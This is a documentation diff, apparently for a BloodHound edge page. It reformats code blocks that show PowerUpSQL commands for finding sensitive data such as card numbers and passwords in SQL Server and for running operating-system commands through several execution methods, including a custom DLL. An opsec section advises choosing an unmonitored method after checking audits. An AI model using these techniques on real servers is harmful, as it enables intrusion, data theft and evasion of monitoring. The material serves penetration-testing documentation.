@@ -22,11 +22,14 @@ Scott Sutherland from NetSPI has authored PowerUpSQL, a PowerShell Toolkit for A
 **Finding Data**
 
 Get a list of databases, sizes, and encryption status:
-```
+
+```powershell
 Get-SQLDatabaseThreaded –Verbose -Instance sqlserver\\instance –Threads 10 -NoDefaults
 ```
+
 Search columns and data for keywords:
-```
+
+```powershell
 Get-SQLColumnSampleDataThreaded –Verbose -Instance sqlserver\\instance –Threads 10 –Keyword "card, password" –SampleSize 2 –ValidateCC -NoDefaults | ft -AutoSize
 ```
 
@@ -35,16 +38,18 @@ Get-SQLColumnSampleDataThreaded –Verbose -Instance sqlserver\\instance –Thre
 Below are examples of PowerUpSQL functions that can be used to execute operating system commands on remote systems through SQL Server using different techniques. The level of access on the operating system will depend largely what privileges are provided to the service account. However, when domain accounts are configured to run SQL Server services, it is very common to see them configured with local administrator privileges.
 
 `xp_cmdshell` Execute Example:
-```
+
+```powershell
 Invoke-SQLOSCmd -Verbose -Command "Whoami" -Threads 10 -Instance sqlserver\instance
 ```
 
 Agent Job Execution Examples:
-```
+
+```powershell
 Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command "echo hello > c:\\windows\\temp\\test1.txt" -Instance sqlserver\instance -username myuser -password mypassword
 ```
 
-```
+```powershell
 Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output "hello world" | out-file c:\\windows\\temp\\test2.txt' -Sleep 20 -Instance sqlserver\instance -username myuser -password mypassword
 ```
 
@@ -52,63 +57,73 @@ Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output "h
 Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\instance -username myuser -password mypassword
 ```
 
-```
+```powershell
 Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\instance -username myuser -password mypassword
 ```
 
 Python Subsystem Execution:
-```
+
+```powershell
 Invoke-SQLOSPython -Verbose -Command "Whoami" -Instance sqlserver\instance
 ```
 
 R subsystem Execution Example:
-```
+
+```powershell
 Invoke-SQLOSR -Verbose -Command "Whoami" -Instance sqlserver\instance
 ```
 
 OLE Execution Example:
-```
+
+```powershell
 Invoke-SQLOSOle -Verbose -Command "Whoami" -Instance sqlserver\instance
 ```
 
 CLR Execution Example:
-```
+
+```powershell
 Invoke-SQLOSCLR -Verbose -Command "Whoami" -Instance sqlserver\instance
 ```
 
 Custom Extended Procedure Execution Example:
 
-1.  Create a custom extended stored procedure:
-```
-Create-SQLFileXpDll -Verbose -OutFile c:\temp\test.dll -Command "echo test > c:\\temp\\test.txt" -ExportName xp_test
-```
+1. Create a custom extended stored procedure:
 
-2.  Host the test.dll on a share readable by the SQL Server service account:
-```
-Get-SQLQuery -Verbose -Query "sp_addextendedproc 'xp_test', '\\\yourserver\\yourshare\\myxp.dll'" -Instance sqlserver\instance
-```
+   ```powershell
+   Create-SQLFileXpDll -Verbose -OutFile c:\temp\test.dll -Command "echo test > c:\\temp\\test.txt" -ExportName xp_test
+   ```
 
-3.  Run extended stored procedure:
-```
-Get-SQLQuery -Verbose -Query "xp_test" -Instance sqlserver\instance
-```
+1. Host the test.dll on a share readable by the SQL Server service account:
 
-4.  Remove extended stored procedure:
-```
-Get-SQLQuery -Verbose -Query "sp_dropextendedproc 'xp_test'" -Instance sqlserver\instance
-```
+   ```powershell
+   Get-SQLQuery -Verbose -Query "sp_addextendedproc 'xp_test', '\\\yourserver\\yourshare\\myxp.dll'" -Instance sqlserver\instance
+   ```
+
+1. Run extended stored procedure:
+
+   ```powershell
+   Get-SQLQuery -Verbose -Query "xp_test" -Instance sqlserver\instance
+   ```
+
+1. Remove extended stored procedure:
+
+   ```powershell
+   Get-SQLQuery -Verbose -Query "sp_dropextendedproc 'xp_test'" -Instance sqlserver\instance
+   ```
 
 ## Opsec Considerations
 
 Prior to executing operating system commands through SQL Server, review the audit configuration and choose a command execution method that is not being monitored.
 
 View audits:
-```
+
+```sql
 SELECT * FROM sys.dm_server_audit_status
 ```
 
 View server specifications:
-```
+
+```sql
 SELECT audit_id,
 a.name as audit_name,
 s.name as server_specification_name,
@@ -126,7 +141,8 @@ ON s.server_specification_id = d.server_specification_id
 ```
 
 View database specifications:
-```
+
+```sql
 SELECT a.audit_id,
 a.name as audit_name,
 s.name as database_specification_name,
@@ -155,7 +171,6 @@ A summary of the what will show up in the logs, along with the TSQL queries for 
 Source: [User](/resources/nodes/user), [Group](/resources/nodes/group), [Computer](/resources/nodes/computer)   
 Destination: [Computer](/resources/nodes/computer)   
 Traversable: ✅  
-
 
 ## References
 
